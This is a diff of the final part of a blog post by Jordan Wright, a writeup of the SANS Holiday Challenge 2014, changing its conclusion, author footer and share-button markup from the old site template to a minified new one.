-<p>As always, this was a fantastic challenge created by the folks at SANS. I enjoyed that this year&rsquo;s challenge contained bits and pieces from many aspects of infosec, and am already looking forward to next year&rsquo;s challenge!</p>
-
-<p>As always, let me know if you have any questions!</p>
-
-<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
-    </section>
-
-
-  <footer class="post-footer">
-
-
-    
-    <figure class="author-image">
-        <a class="img" href="https://jordan-wright.com/blog/" style="background-image: url(https://jordan-wright.com/blog/images/jordan-profile.jpg)"><span class="hidden">Jordan Wright's Picture</span></a>
-    </figure>
-    
-
-    
-
-
-
-
-
-<section class="author">
-  <h4><a href="https://jordan-wright.com/blog/">Jordan Wright</a></h4>
-  
-  <p>Security Researcher, Open-Source Developer.</p>
-  
-  <div class="author-meta">
-    <span class="author-location icon-location">San Antonio, Texas</span>
-    
-  </div>
-</section>
-
-
-
-    
-<section class="share">
-  <h4>Share this post</h4>
-  <a class="icon-twitter" style="font-size: 1.4em" href="https://twitter.com/share?text=SANS%20Holiday%20Challenge%202014%20-%20Writeup&nbsp;-&nbsp;Jordan%20Wright&amp;url=https%3a%2f%2fjordan-wright.com%2fblog%2f2015%2f01%2f05%2fsans-holiday-challenge-2014-writeup%2f"
-      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
-      <span class="hidden">Twitter</span>
-  </a>
-  <a class="icon-facebook" style="font-size: 1.4em" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fjordan-wright.com%2fblog%2f2015%2f01%2f05%2fsans-holiday-challenge-2014-writeup%2f"
-      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
-      <span class="hidden">Facebook</span>
-  </a>
-  <a class="icon-google-plus" style="font-size: 1.4em" href="https://plus.google.com/share?url=https%3a%2f%2fjordan-wright.com%2fblog%2f2015%2f01%2f05%2fsans-holiday-challenge-2014-writeup%2f"
-     onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
-      <span class="hidden">Google+</span>
-  </a>
-</section>
-
-
-
-    
-
-
-
-
-  </footer>
-</article>
-
-</main>
-    </div>
-    <script type="text/javascript" src="https://jordan-wright.com/blog/js/jquery.js"></script>
-    <script type="text/javascript" src="https://jordan-wright.com/blog/js/jquery.fitvids.js"></script>
-    <script type="text/javascript" src="https://jordan-wright.com/blog/js/index.js"></script>
-    
-</body>
-</html>
-
+</code></pre><p>There it is! All the secrets have been retrieved.</p><h3 id=conclusion>Conclusion</h3><p>As always, this was a fantastic challenge created by the folks at SANS. I enjoyed that this year&rsquo;s challenge contained bits and pieces from many aspects of infosec, and am already looking forward to next year&rsquo;s challenge!</p><p>As always, let me know if you have any questions!</p><p>-Jordan (<a href=http://twitter.com/jw_sec>@jw_sec</a>)</p></section><footer class=post-footer><figure class=author-image><a class=img href=https://jordan-wright.com/blog/ style=background-image:url(https://jordan-wright.com/blog/images/jordan-profile.jpg)><span class=hidden>Jordan Wright's Picture</span></a></figure><section class=author><h4><a href=https://jordan-wright.com/blog/>Jordan Wright</a></h4><p>Security Researcher, Open-Source Developer.</p><div class=author-meta><span class="author-location icon-location">Texas</span></div></section><section class=share><h4>Share this post</h4><a class=share-link href="https://twitter.com/intent/tweet?text=SANS%20Holiday%20Challenge%202014%20-%20Writeup&nbsp;-&nbsp;Jordan%20Wright&amp;url=https%3a%2f%2fjordan-wright.com%2fblog%2f2015%2f01%2f05%2fsans-holiday-challenge-2014-writeup%2f" onclick='return window.open(this.href,"x-share","width=550,height=235"),!1'><svg class="share-icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M18.244 2.25h3.308l-7.227 8.26 8.503 11.24h-6.68l-5.23-6.84-6.02 6.84H1.59l7.73-8.812L1.16 2.25h6.85l4.73 6.25 5.504-6.25zm-1.16 17.52h1.833L6.71 4.126H4.745L17.084 19.77z"/></svg>
+<span class=hidden>X</span>
+</a><a class=share-link href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fjordan-wright.com%2fblog%2f2015%2f01%2f05%2fsans-holiday-challenge-2014-writeup%2f&amp;t=SANS%20Holiday%20Challenge%202014%20-%20Writeup" onclick='return window.open(this.href,"hn-share","width=600,height=400"),!1'><svg class="share-icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path fill-rule="evenodd" d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+<span class=hidden>Hacker News</span>
+</a><a class=share-link href="https://www.linkedin.com/sharing/share-offsite/?url=https%3a%2f%2fjordan-wright.com%2fblog%2f2015%2f01%2f05%2fsans-holiday-challenge-2014-writeup%2f" onclick='return window.open(this.href,"linkedin-share","width=600,height=500"),!1'><svg class="share-icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853.0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.6.0 4.264 2.37 4.264 5.455v6.286zM5.337 7.433a2.062 2.062.0 110-4.123 2.062 2.062.0 010 4.123zM6.814 20.452H3.861V9h2.953v11.452zM22.225.0H1.771C.792.0.0.774.0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2.0 22.222.0z"/></svg>
+<span class=hidden>LinkedIn</span></a></section></footer></article></main></div><script type=text/javascript src=https://jordan-wright.com/blog/js/jquery.js></script><script type=text/javascript src=https://jordan-wright.com/blog/js/index.js></script></body></html>
